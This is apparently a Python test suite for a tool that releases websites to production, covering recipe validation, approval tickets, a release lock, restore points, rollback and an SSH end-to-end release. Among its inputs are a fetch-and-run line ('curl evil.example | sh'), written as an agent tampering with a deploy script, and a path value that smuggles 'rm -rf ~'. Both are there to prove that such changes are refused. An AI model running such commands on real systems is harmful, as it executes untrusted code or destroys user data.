# SPDX-License-Identifier: Apache-2.0
"""Releases to production: recipes, authorization, the lock, restore points, rollback.

The end-to-end tests release to a real, unprivileged ``sshd`` on a spare port
(certificate sign-in, rsync, a restart command, a data snapshot) with the
health check served by a local HTTP server. They skip cleanly where sshd,
rsync or ssh-keygen are missing. Everything else uses local "servers"
(folders) through the command and hosting-CLI recipes, so it runs anywhere.
"""
from __future__ import annotations

import json
import os
from pathlib import Path
import shutil
import socket
import subprocess
import sys
import textwrap
import threading
import time
import unittest
from unittest import mock

from test_platform_support import HAVE_SSH_KEYGEN, PlatformTestCase, quick_http_server

from luma_playground.core import places, security
from luma_playground.core.model import GoalStatus, Place
from luma_playground.core.places import (ProductionProtected, RecipeNotTrusted, ReleaseBusy, ReleaseError,
                                         PlaceError)
from luma_playground.core.project import init_git

PROJECT_ID = "kiln-0123456789abcdef"
HAVE_GIT = shutil.which("git") is not None


def free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


class ReleaseTestCase(PlatformTestCase):
    """A Kiln project with git, a small site in ``site/`` and a goal to release."""

    def setUp(self):
        super().setUp()
        self._home = os.environ.get("HOME")
        os.environ["HOME"] = str(self.tmp / "home")          # no real git identity or known_hosts
        (self.tmp / "home").mkdir()
        self.write("site/index.html", "<h1>Kiln version 1</h1>\n")
        self.write("site/.env", "SECRET=nope\n")
        store = self.store()
        self.goal = store.create_goal("Studio photos on the home page", outcome="People see the studio.")
        if HAVE_GIT:
            init_git(self.project_dir, "First version")

    def tearDown(self):
        if self._home is None:
            os.environ.pop("HOME", None)
        else:
            os.environ["HOME"] = self._home
        super().tearDown()

    # helpers

    def set_production(self, **fields) -> dict:
        store = self.store()
        project = store.read_project()
        project.places = [p for p in project.places if p.id != "production"]
        extra = {k: fields.pop(k) for k in ("url", "path") if k in fields}
        project.places.append(Place(id="production", name="Production", role="production",
                                    kind=fields.pop("kind", "local"), extra=extra, **fields))
        store.write_project(project)
        return project.place("production").to_dict()

    def deploy(self, body: str) -> None:
        self.write(".playground/run.toml", "[app]\ncommand = \"true\"\n\n[deploy]\n" + textwrap.dedent(body))

    def ticket(self, who: str = "noor", place: str = "production", review: str = "photos"):
        return places.authorize_release(self.project_dir, {"id": review, "ready": True, "destination": place},
                                        place, who)

    def release(self, **kw):
        kw.setdefault("trust_recipe", True)
        return places.release(self.project_dir, "production", kw.pop("ticket", None) or self.ticket(),
                              kw.pop("goal_id", self.goal.id), bus=self.bus, **kw)

    def change_site(self, words: str) -> None:
        (self.project_dir / "site" / "index.html").write_text(f"<h1>Kiln {words}</h1>\n")

    def history(self, kind: str = "release") -> list:
        return [e for e in self.store().read_activity() if e.kind == kind]

    def local_server_recipe(self, server: Path, url: str, extra: str = "") -> None:
        """A 'server' that is a folder here, released to with a command recipe."""
        self.set_production(url=url)
        self.deploy(f"""
            kind = "command"
            source = "site"
            command = "rm -rf {server}/app && mkdir -p {server}/app && cp -R \\"$PLAYGROUND_RELEASE_DIR\\"/. {server}/app/"
            expect_text = "Kiln"
            health_timeout_s = 3
        """ + textwrap.dedent(extra))


# ───────────────────────────── recipes ─────────────────────────────

class RecipeTests(ReleaseTestCase):
    def test_default_applies_to_production_and_places_override(self):
        self.set_production(kind="ssh", host="kiln.example", user="deploy", url="https://kiln.example",
                            path="/srv/kiln")
        self.deploy("""
            source = "site"
            restart = "sudo systemctl reload kiln"
            health = "/health"
            [deploy.places.stage-box]
            kind = "command"
            command = "./deploy.sh stage"
        """)
        recipe = places.read_deploy_recipe(self.project_dir, "production")
        self.assertEqual((recipe.kind, recipe.path, recipe.source), ("ssh", "/srv/kiln", "site"))
        self.assertEqual(recipe.health, "https://kiln.example/health")
        self.assertIn(".playground", recipe.excludes)
        self.assertIn(".env", recipe.excludes)
        # Not production and no override: no recipe. This computer never gets one by default.
        self.assertIsNone(places.read_deploy_recipe(self.project_dir, "this-computer"))
        store = self.store()
        project = store.read_project()
        project.places.append(Place(id="stage-box", name="Stage box", role="preview", kind="local"))
        store.write_project(project)
        self.assertEqual(places.read_deploy_recipe(self.project_dir, "stage-box").kind, "command")
        commands = recipe.commands(places.get_place(self.project_dir, "production"))
        self.assertIn(("Production", "sudo systemctl reload kiln"), commands)

    def test_unsafe_or_unclear_recipes_are_refused_in_plain_words(self):
        self.set_production(kind="ssh", host="kiln.example", user="deploy")
        cases = {
            'kind = "ftp"': "Playground knows ssh",
            'path = "/"': "folder of their own",
            'path = "/srv"': "folder of their own",
            'path = "~"': "folder of their own",
            'path = "/srv/../etc"': "“..”",
            'path = "/srv/kiln; rm -rf ~"': "letters, numbers",
            'path = "/srv/kiln"\nsource = "../elsewhere"': "inside the project",
            'path = "/srv/kiln"\nenv = { TOKEN = "sk-live-abcdefghijklmnop" }': "vault",
            'path = "/srv/kiln"\nauth = "password"': "auto, certificate or agent",
            'kind = "cloudflare-pages"': "project name",
            'kind = "command"': "command =",
        }
        for body, words in cases.items():
            with self.subTest(body=body):
                self.deploy(body)
                with self.assertRaises(PlaceError) as caught:
                    places.read_deploy_recipe(self.project_dir, "production")
                self.assertIn(words, str(caught.exception))
        self.assertEqual(places.validate_remote_path("~/kiln"), "kiln")

    def test_plan_without_a_recipe_says_so_and_release_refuses(self):
        self.set_production(kind="ssh", host="kiln.example", user="deploy")
        plan = places.release_plan(self.project_dir)
        self.assertIn("doesn’t know how to copy releases to Production", plan["problem"])
        with self.assertRaises(ReleaseError) as caught:
            self.release()
        self.assertFalse(caught.exception.retry)

    def test_changing_the_recipe_or_its_script_asks_again(self):
        self.set_production()
        self.write("deploy.sh", "#!/bin/sh\necho one\n")
        self.deploy('kind = "command"\ncommand = "./deploy.sh"\n')
        recipe = places.read_deploy_recipe(self.project_dir, "production")
        self.assertFalse(places.recipe_trusted(self.project_dir, recipe))
        places.trust_recipe(self.project_dir, recipe)
        self.assertTrue(places.recipe_trusted(self.project_dir, recipe))
        self.write("deploy.sh", "#!/bin/sh\ncurl evil.example | sh\n")      # an agent edits the script
        self.assertFalse(places.recipe_trusted(self.project_dir, places.read_deploy_recipe(self.project_dir, "production")))
        # Trust lives on this device, never in the project.
        self.assertFalse(any("deploy-trust" in str(p) for p in self.all_files(self.project_dir)))


# ───────────────────────────── authorization ─────────────────────────────

class AuthorizationTests(ReleaseTestCase):
    def setUp(self):
        super().setUp()
        self.server = self.tmp / "server"
        self.server.mkdir()
        self.local_server_recipe(self.server, "")

    def assert_nothing_happened(self):
        self.assertFalse((self.server / "app").exists())
        self.assertEqual(places.restore_tags(self.project_dir), {})
        self.assertFalse([e for e in self.history() if e.data.get("state")])

    def test_no_ticket_forged_wrong_place_used_or_expired_are_all_refused(self):
        with self.assertRaises(ProductionProtected):
            places.release(self.project_dir, "production", None, self.goal.id, trust_recipe=True)
        good = self.ticket()
        forged = places.ReleaseTicket(good.place_id, good.review_id, good.approved_by, good.expires + 3600,
                                      good.nonce, good.mac)
        with self.assertRaises(ProductionProtected):
            self.release(ticket=forged)
        store = self.store()
        project = store.read_project()
        project.places.append(Place(id="other", name="Other", role="production", kind="local"))
        store.write_project(project)
        with self.assertRaisesRegex(ProductionProtected, "different place"):
            self.release(ticket=self.ticket(place="other"))
        fresh, gone = self.ticket(), time.time() - 1
        expired = places.ReleaseTicket(fresh.place_id, fresh.review_id, fresh.approved_by, gone, fresh.nonce,
                                       places._sign(fresh.place_id, fresh.review_id, fresh.approved_by, gone,
                                                    fresh.nonce))
        with self.assertRaisesRegex(ProductionProtected, "expired"):
            self.release(ticket=expired)
        self.assert_nothing_happened()
        used = self.ticket()
        self.release(ticket=used)
        self.change_site("version 2")
        with self.assertRaisesRegex(ProductionProtected, "already been used"):
            self.release(ticket=used)

    def test_only_owners_and_reviewers_approve_and_review_must_be_ready(self):
        with self.assertRaises(ProductionProtected):
            self.ticket(who="priya")                            # a builder
        with self.assertRaises(ProductionProtected):
            places.authorize_release(self.project_dir, {"id": "x", "ready": False, "destination": "production"},
                                     "production", "noor")
        self.release(ticket=self.ticket(who="rae"))             # a reviewer may
        self.assertEqual(self.history()[-1].actor, "rae")

    def test_an_unagreed_recipe_stops_before_the_ticket_is_spent(self):
        ticket = self.ticket()
        with self.assertRaises(RecipeNotTrusted) as caught:
            places.release(self.project_dir, "production", ticket, self.goal.id)
        self.assertTrue(any("cp -R" in what for _where, what in caught.exception.commands))
        self.assert_nothing_happened()
        self.release(ticket=ticket)                             # the same ticket still works once agreed


# ───────────────────────────── the lock ─────────────────────────────

class LockTests(ReleaseTestCase):
    def setUp(self):
        super().setUp()
        self.server = self.tmp / "server"
        self.server.mkdir()
        self.local_server_recipe(self.server, "")

    def test_a_release_while_another_holds_the_lock_is_refused_and_keeps_its_ticket(self):
        ticket = self.ticket()
        with places.release_lock(self.project_dir, "A release to Production"):
            with self.assertRaises(ReleaseBusy) as caught:
                self.release(ticket=ticket)
            self.assertIn("still running", str(caught.exception))
        self.assertFalse((self.server / "app").exists())
        self.assertTrue(self.release(ticket=ticket)["ok"])     # not spent by the refusal

    def test_another_process_holding_the_lock(self):
        if not hasattr(places, "fcntl") or places.fcntl is None:
            self.skipTest("no flock here")
        lock = self.project_dir / ".playground" / "local" / "release.lock"
        lock.parent.mkdir(parents=True, exist_ok=True)
        holder = subprocess.Popen([sys.executable, "-c", textwrap.dedent(f"""
            import fcntl, json, sys, time
            f = open({str(lock)!r}, "a+")
            fcntl.flock(f, fcntl.LOCK_EX)
            f.write(json.dumps({{"what": "Going back on Production", "started": "2026-10-09T10:04:00Z"}})); f.flush()
            print("held", flush=True)
            sys.stdin.readline()
        """)], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
        try:
            self.assertEqual(holder.stdout.readline().strip(), "held")
            with self.assertRaisesRegex(ReleaseBusy, "Going back on Production"):
                self.release()
        finally:
            holder.stdin.close()
            holder.wait(timeout=10)
            holder.stdout.close()
        self.assertTrue(self.release()["ok"])

    def test_two_releases_at_once_one_runs(self):
        self.deploy(f"""
            kind = "command"
            source = "site"
            command = "sleep 1; mkdir -p {self.server}/app; date >> {self.server}/app/runs"
        """)
        tickets = [self.ticket(review="a"), self.ticket(review="b")]
        outcomes: list = []

        def go(ticket):
            try:
                outcomes.append(self.release(ticket=ticket)["ok"])
            except ReleaseBusy as error:
                outcomes.append(error)

        threads = [threading.Thread(target=go, args=(t,)) for t in tickets]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join(timeout=60)
        self.assertEqual(sorted(type(o).__name__ for o in outcomes), ["ReleaseBusy", "bool"])
        self.assertEqual(len((self.server / "app" / "runs").read_text().splitlines()), 1)


# ───────────────────────────── releases without SSH ─────────────────────────────

@unittest.skipUnless(HAVE_GIT, "git isn't installed")
class LocalReleaseTests(ReleaseTestCase):
    def setUp(self):
        super().setUp()
        self.server = self.tmp / "server"
        (self.server / "app").mkdir(parents=True)
        self.http = quick_http_server(self.server / "app")
        self.url = self.http.url + "index.html"

    def tearDown(self):
        self.http.shutdown()
        self.http.server_close()
        super().tearDown()

    def test_release_end_to_end_with_a_command_recipe(self):
        self.local_server_recipe(self.server, self.url)
        steps: list[tuple[str, str]] = []
        result = self.release(on_step=lambda step, state, label, detail: steps.append((step, state)))
        self.assertTrue(result["ok"])
        self.assertEqual(result["restore_point"], 1)
        self.assertIn("version 1", (self.server / "app" / "index.html").read_text())
        self.assertEqual(steps, [("restore", "running"), ("restore", "done"), ("copy", "running"), ("copy", "done"),
                                 ("check", "running"), ("check", "done")])
        # Restore point: a commit and a tag.
        tags = places.restore_tags(self.project_dir)
        self.assertEqual(list(tags), [1])
        head = subprocess.run(["git", "rev-parse", "HEAD"], cwd=self.project_dir, capture_output=True,
                              text=True).stdout.strip()
        self.assertEqual(tags[1], head)
        # History, the goal, the thread, the events.
        entry = self.history()[-1]
        self.assertEqual((entry.data["state"], entry.data["restore_point"], entry.data["place"]),
                         ("live", 1, "production"))
        goal = self.store().read_goal(self.goal.id)
        self.assertEqual(goal.status, GoalStatus.LIVE)
        self.assertIn("Restore point 1", self.store().read_thread(self.goal.id)[-1].text)
        finished = self.topics(places.RELEASE_FINISHED)
        self.assertTrue(finished and finished[-1]["ok"])
        self.assertEqual([p["state"] for p in self.topics(places.RELEASE_STEP)][-1], "done")
        point = places.restore_points(self.project_dir)[0]
        self.assertEqual((point["number"], point["live"], point["code"]), (1, True, "tag"))

    def test_same_code_again_reuses_the_restore_point_and_new_code_gets_the_next(self):
        self.local_server_recipe(self.server, self.url)
        self.assertEqual(self.release()["restore_point"], 1)
        self.assertEqual(self.release()["restore_point"], 1)
        self.change_site("version 2")
        self.assertEqual(self.release()["restore_point"], 2)
        log = subprocess.run(["git", "log", "-1", "--format=%s"], cwd=self.project_dir, capture_output=True,
                             text=True).stdout
        self.assertIn("Restore point 2", log)

    def test_a_failed_health_check_names_the_step_and_retry_works(self):
        self.local_server_recipe(self.server, self.http.url + "missing.html")
        with self.assertRaises(ReleaseError) as caught:
            self.release()
        error = caught.exception
        self.assertEqual(error.step, "check")
        self.assertIn("answered with 404", str(error))
        self.assertTrue(error.retry)
        self.assertEqual(error.restore_point, 1)
        failed = self.history()[-1]
        self.assertEqual((failed.data["state"], failed.data["step"]), ("failed", "check"))
        self.assertEqual(self.store().read_goal(self.goal.id).status.value, "working")
        self.assertEqual(places.restore_points(self.project_dir), [])        # nothing went live
        # Fix the address and try again: same restore point, now live.
        self.set_production(url=self.url)
        self.assertEqual(self.release()["restore_point"], 1)
        self.assertTrue(places.restore_points(self.project_dir)[0]["live"])

    def test_a_failing_command_stops_at_copying_with_its_output_scrubbed(self):
        self.set_production(url=self.url)
        self.deploy("""
            kind = "command"
            command = "echo using token=sk-live-abcdefghijklmnopqrstu; exit 3"
        """)
        with self.assertRaises(ReleaseError) as caught:
            self.release()
        self.assertEqual(caught.exception.step, "copy")
        self.assertIn("exit 3", str(caught.exception))
        self.assertNotIn("sk-live", caught.exception.detail)
        for path in self.all_files(self.project_dir / ".playground"):
            if path.suffix in (".log", ".jsonl", ".json"):
                self.assertNotIn("abcdefghijklmnopqrstu", path.read_text(errors="replace"), path)

    def test_build_runs_without_credentials(self):
        self.set_production(url=self.url)
        os.environ["SOME_API_TOKEN"] = "do-not-pass-me"
        self.addCleanup(os.environ.pop, "SOME_API_TOKEN", None)
        self.deploy(f"""
            kind = "command"
            build = "mkdir -p dist && cp site/index.html dist/ && env > dist/build-env.txt"
            source = "dist"
            command = "cp -R \\"$PLAYGROUND_RELEASE_DIR\\"/. {self.server}/app/"
        """)
        self.release()
        env = (self.server / "app" / "build-env.txt").read_text()
        self.assertNotIn("do-not-pass-me", env)
        self.assertNotIn("SSH_AUTH_SOCK", env)

    def test_a_hosting_cli_publishes_and_its_address_is_checked(self):
        self.set_production()                                     # no url: the CLI's address is used
        fake = self.install_fake("vercel", textwrap.dedent(f"""\
            #!{sys.executable}
            import json, os, shutil, sys
            args = sys.argv[1:]
            open({str(self.tmp / 'vercel.json')!r}, "w").write(json.dumps(args))
            shutil.copytree(args[1], {str(self.server / 'app')!r}, dirs_exist_ok=True)
            print("Production: {self.url}")
        """))
        self.assertTrue(fake.exists())
        self.deploy('kind = "vercel"\nsource = "site"\nexpect_text = "Kiln"\n')
        result = self.release()
        args = json.loads((self.tmp / "vercel.json").read_text())
        self.assertEqual(args[0], "deploy")
        self.assertIn("--prod", args)
        self.assertEqual(result["url"], self.url)
        self.assertTrue(result["health"]["ok"])
        # A copy of what went out is kept for going back, without the excluded files.
        copy = self.project_dir / ".playground" / "local" / "releases" / "production" / "restore-1"
        self.assertTrue((copy / "index.html").is_file())
        self.assertFalse((copy / ".env").exists())

    def test_a_missing_hosting_cli_says_how_to_get_it(self):
        self.set_production(url=self.url)
        self.deploy('kind = "netlify"\nsource = "site"\n')
        real = shutil.which
        with mock.patch.object(places.shutil, "which", side_effect=lambda n: None if n == "netlify" else real(n)):
            with self.assertRaises(ReleaseError) as caught:
                self.release()
        self.assertIn("Netlify’s command-line tool (netlify) isn’t installed", str(caught.exception))
        self.assertEqual(caught.exception.step, "copy")
        self.assertFalse(caught.exception.retry)

    def test_dry_run_changes_nothing_and_needs_no_ticket(self):
        self.local_server_recipe(self.server, self.url, 'data_where = "local"\nsnapshot = "echo data"\n')
        result = places.release(self.project_dir, "production", None, self.goal.id, dry_run=True)
        self.assertTrue(result["dry_run"])
        words = " ".join(step["words"] for step in result["plan"])
        self.assertIn("restore point 1", words)
        self.assertIn("echo data", words)
        self.assertFalse((self.server / "app" / "index.html").exists())
        self.assertEqual(places.restore_tags(self.project_dir), {})
        self.assertEqual(self.history(), [])

    def test_rollback_puts_the_code_back_and_the_data_only_when_asked(self):
        db = self.tmp / "db.txt"
        db.write_text("rows: 1\n")
        self.local_server_recipe(self.server, self.url, f"""
            data_where = "local"
            snapshot = "cat {db}"
            restore_data = "cat > {db}"
        """)
        self.release()                                     # v1 goes live; data before it: rows 1
        db.write_text("rows: 2\n")                         # people book while v1 is live
        self.change_site("version 2")
        self.release()                                     # v2; the data saved now is v1's: rows 2
        db.write_text("rows: 3\n")
        points = places.restore_points(self.project_dir)
        self.assertEqual([(p["number"], p["live"]) for p in points], [(2, True), (1, False)])
        self.assertIsNotNone(points[1]["data"])
        self.assertIn("rows: 2", Path(points[1]["data"]["path"]).read_text())
        plan = places.rollback_plan(self.project_dir, 1)
        self.assertTrue(plan["ok"])
        self.assertIsNotNone(plan["data"])
        # Without a ticket: refused.
        with self.assertRaises(ProductionProtected):
            places.rollback(self.project_dir, 1, None)
        # Code only.
        ticket = places.authorize_rollback(self.project_dir, 1, "noor")
        result = places.rollback(self.project_dir, 1, ticket, bus=self.bus)
        self.assertTrue(result["ok"])
        self.assertIn("version 1", (self.server / "app" / "index.html").read_text())
        self.assertEqual(db.read_text(), "rows: 3\n")
        entry = self.history("restore")[-1]
        self.assertEqual((entry.data["went_back_to"], entry.data["data_restored"]), (1, False))
        self.assertEqual(places.live_restore_point(self.project_dir), 1)
        # The working copy and git are untouched.
        self.assertIn("version 2", (self.project_dir / "site" / "index.html").read_text())
        # People keep booking under version 1; then forward to 2 again, with 2's data.
        db.write_text("rows: 4\n")
        steps: list[str] = []
        places.rollback(self.project_dir, 2, places.authorize_rollback(self.project_dir, 2, "noor"),
                        restore_data=True, on_step=lambda step, state, *_: steps.append(f"{step}:{state}"))
        self.assertIn("version 2", (self.server / "app" / "index.html").read_text())
        self.assertEqual(db.read_text(), "rows: 3\n")              # as it was when 2 was replaced
        self.assertIn("data:done", steps)
        # The data as it was just before going back is kept, so that can be undone too.
        before = self.history("restore")[-1].data["snapshot"]
        snapshot = self.project_dir / ".playground/local/snapshots" / before
        self.assertIn("rows: 4", snapshot.read_text())
        self.assertEqual(os.stat(snapshot).st_mode & 0o777, 0o600)
        self.assertEqual(places.restore_points(self.project_dir)[1]["data"]["snapshot"], before)

    def test_rollback_refuses_what_it_cannot_do(self):
        self.local_server_recipe(self.server, self.url)
        self.release()
        with self.assertRaisesRegex(ReleaseError, "what’s live now"):
            places.rollback(self.project_dir, 1, self.ticket())
        with self.assertRaisesRegex(PlaceError, "no restore point 7"):
            places.authorize_rollback(self.project_dir, 7, "noor")
        self.change_site("version 2")
        self.release()
        with self.assertRaisesRegex(ReleaseError, "copy of the data"):
            places.rollback(self.project_dir, 1, places.authorize_rollback(self.project_dir, 1, "noor"),
                            restore_data=True)
        with self.assertRaises(ProductionProtected):
            places.authorize_rollback(self.project_dir, 1, "priya")

    def test_release_to_this_computer_needs_no_recipe_or_ticket(self):
        result = places.release(self.project_dir, "this-computer", None, self.goal.id, bus=self.bus)
        self.assertEqual(result["steps"][1]["state"], "skipped")
        self.assertEqual(self.store().read_goal(self.goal.id).status, GoalStatus.LIVE)


# ───────────────────────────── health checks ─────────────────────────────

class HealthTests(unittest.TestCase):
    def test_answers_and_failures_in_plain_words(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, "index.html").write_text("Kiln is up")
            server = quick_http_server(tmp)
            try:
                ok = places.check_health(server.url + "index.html", expect_text="Kiln", timeout_s=2)
                self.assertTrue(ok["ok"], ok)
                self.assertIn("answered in", ok["message"])
                wrong = places.check_health(server.url + "index.html", expect_text="Pottery", timeout_s=0)
                self.assertIn("doesn’t show “Pottery”", wrong["message"])
                missing = places.check_health(server.url + "nope", timeout_s=0)
                self.assertEqual(missing["status"], 404)
            finally:
                server.shutdown()
                server.server_close()
        closed = places.check_health(f"http://127.0.0.1:{free_port()}/", timeout_s=1, interval_s=0.3)
        self.assertFalse(closed["ok"])
        self.assertIn("isn’t accepting connections", closed["message"])


# ───────────────────────────── a real SSH server ─────────────────────────────

class SshServer:
    """An unprivileged sshd on a spare port that trusts the project's CA (like the security tests)."""

    def __init__(self, tmp: Path, ca, user: str) -> None:
        self.tmp, self.user = tmp, user
        sshd = next((p for p in ("/usr/sbin/sshd", "/usr/bin/sshd") if os.path.exists(p)), None)
        if not sshd:
            raise unittest.SkipTest("no sshd here")
        place = {"id": "production", "name": "Production", "role": "production", "user": user, "host": "127.0.0.1"}
        server = tmp / "sshd-trust"
        script = security.server_setup_instructions(place, ca)["script"].replace("/etc/ssh/playground", str(server))
        script = script.replace('if [ "$(id -u)" != 0 ]; then echo "Please run this with sudo."; exit 1; fi\n', "")
        subprocess.run(["sh", "-c", script.split("CONF=/etc/ssh/sshd_config.d")[0]], check=True, capture_output=True)
        subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", str(tmp / "hostkey")], check=True)
        self.port = free_port()
        lines = [line.replace("/etc/ssh/playground", str(server))
                 for line in security.server_setup_instructions(place, ca)["sshd_config_lines"]]
        config = tmp / "sshd_config"
        config.write_text("\n".join([
            f"Port {self.port}", "ListenAddress 127.0.0.1", f"HostKey {tmp / 'hostkey'}",
            f"PidFile {tmp / 'sshd.pid'}", "AuthorizedKeysFile none", "StrictModes no",
            "PasswordAuthentication no", "KbdInteractiveAuthentication no", "UsePAM no", *lines, ""]))
        self.proc = subprocess.Popen([sshd, "-D", "-e", "-f", str(config)], stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT)
        deadline = time.time() + 5
        while time.time() < deadline:
            if self.proc.poll() is not None:
                raise unittest.SkipTest("sshd won't run unprivileged here: " + self.proc.stdout.read().decode()[-200:])
            try:
                socket.create_connection(("127.0.0.1", self.port), timeout=0.2).close()
                return
            except OSError:
                time.sleep(0.1)
        self.stop()
        raise unittest.SkipTest("sshd didn't start")

    def stop(self) -> None:
        if self.proc.poll() is None:
            self.proc.terminate()
            self.proc.wait(timeout=5)
        self.proc.stdout.close()


@unittest.skipUnless(HAVE_SSH_KEYGEN and HAVE_GIT and shutil.which("ssh") and shutil.which("rsync"),
                     "needs ssh, ssh-keygen, rsync and git")
class SshReleaseTests(ReleaseTestCase):
    """Release over SSH for real: certificate sign-in, rsync, restart, data snapshot, health, rollback."""

    def setUp(self):
        super().setUp()
        self.user = os.environ.get("USER") or subprocess.run(["id", "-un"], capture_output=True, text=True).stdout.strip()
        if not security._USER_RE.match(self.user):
            self.skipTest("this account name can't be a principal file name")
        store = self.store()
        project = store.read_project()
        project.id = PROJECT_ID
        store.write_project(project)
        self.ca = security.ProjectCA.create(PROJECT_ID)
        key = security.device_key()
        self.ca.add_member("noor", "Noor", "owner", key.public_key)    # the owner's device; no certificate yet
        self.sshd = SshServer(self.tmp, self.ca, self.user)
        self.addCleanup(self.sshd.stop)
        self.srv = self.tmp / "srv"
        (self.srv / "kiln").mkdir(parents=True)
        (self.srv / "kiln" / "uploads").mkdir()
        (self.srv / "kiln" / "uploads" / "photo.txt").write_text("a customer's upload")
        (self.srv / "kiln" / "stale.txt").write_text("from an old release")
        (self.srv / "db.txt").write_text("rows: 1\n")
        self.http = quick_http_server(self.srv / "kiln")
        self.addCleanup(lambda: (self.http.shutdown(), self.http.server_close()))
        self.set_production(kind="ssh", host="127.0.0.1", user=self.user, port=self.sshd.port,
                            url=self.http.url + "index.html", path=str(self.srv / "kiln"))
        self.deploy(f"""
            source = "site"
            exclude = ["uploads", ".env"]
            restart = "date >> {self.srv}/restarts"
            expect_text = "Kiln"
            health_timeout_s = 10
            snapshot = "cat {self.srv}/db.txt"
            restore_data = "cat > {self.srv}/db.txt"
        """)

    def test_release_and_rollback_over_ssh(self):
        # Dry run first: rsync -n lists the change, and nothing on the server moves.
        dry = places.release(self.project_dir, "production", None, self.goal.id, dry_run=True)
        self.assertEqual(dry["problem"], "", dry)
        self.assertTrue(any("index.html" in line for line in dry["changes"]), dry["changes"])
        self.assertFalse((self.srv / "kiln" / "index.html").exists())
        self.assertFalse((self.srv / "restarts").exists())

        result = self.release()
        self.assertTrue(result["ok"], result)
        kiln = self.srv / "kiln"
        self.assertIn("version 1", (kiln / "index.html").read_text())
        self.assertFalse((kiln / ".env").exists())                       # never shipped
        self.assertFalse((kiln / ".playground").exists())
        self.assertFalse((kiln / "stale.txt").exists())                  # --delete
        self.assertTrue((kiln / "uploads" / "photo.txt").exists())       # excluded, so kept
        self.assertEqual(len((self.srv / "restarts").read_text().splitlines()), 1)
        self.assertTrue(result["health"]["ok"])
        self.assertIn("rows: 1", (self.project_dir / ".playground/local/snapshots" / result["snapshot"]).read_text())
        # Signed in with a project certificate made for the release, not a password or the person's agent.
        cert = security.device_key(create=False).certificate_path(PROJECT_ID)
        self.assertTrue(cert.exists())
        # The log shows what ran, and holds no private key.
        log = (self.project_dir / result["log"]).read_text()
        self.assertIn("copy to Production", log)
        self.assertNotIn("PRIVATE KEY", log)

        (self.srv / "db.txt").write_text("rows: 2\n")
        self.change_site("version 2")
        second = self.release()
        self.assertEqual(second["restore_point"], 2)
        self.assertIn("version 2", (kiln / "index.html").read_text())
        (self.srv / "db.txt").write_text("rows: 3\n")

        ticket = places.authorize_rollback(self.project_dir, 1, "noor")
        back = places.rollback(self.project_dir, 1, ticket, restore_data=True, bus=self.bus)
        self.assertTrue(back["ok"], back)
        self.assertIn("version 1", (kiln / "index.html").read_text())
        self.assertEqual((self.srv / "db.txt").read_text(), "rows: 2\n")
        self.assertTrue((kiln / "uploads" / "photo.txt").exists())
        self.assertEqual(places.live_restore_point(self.project_dir), 1)

    def test_a_folder_it_cannot_write_is_named(self):
        locked = self.srv / "locked"
        locked.mkdir()
        os.chmod(locked, 0o500)
        try:
            if os.access(locked, os.W_OK):
                self.skipTest("running as root")
            self.deploy(f'source = "site"\npath = "{locked}/kiln"\n')
            with self.assertRaises(ReleaseError) as caught:
                self.release()
        finally:
            os.chmod(locked, 0o700)
        self.assertEqual(caught.exception.step, "copy")
        self.assertIn("can’t write to", str(caught.exception))

    def test_an_unknown_server_and_a_broken_restart_are_plain_words(self):
        self.deploy(f'source = "site"\nrestart = "exit 7"\nhealth_timeout_s = 2\n')
        with self.assertRaises(ReleaseError) as caught:
            self.release()
        self.assertIn("restart command stopped with an error (exit 7)", str(caught.exception))
        self.set_production(kind="ssh", host="127.0.0.1", user=self.user, port=free_port(),
                            path=str(self.srv / "kiln"))
        with self.assertRaises(ReleaseError) as caught:
            self.release()
        self.assertIn("accepting SSH connections", str(caught.exception))


if __name__ == "__main__":
    unittest.main()
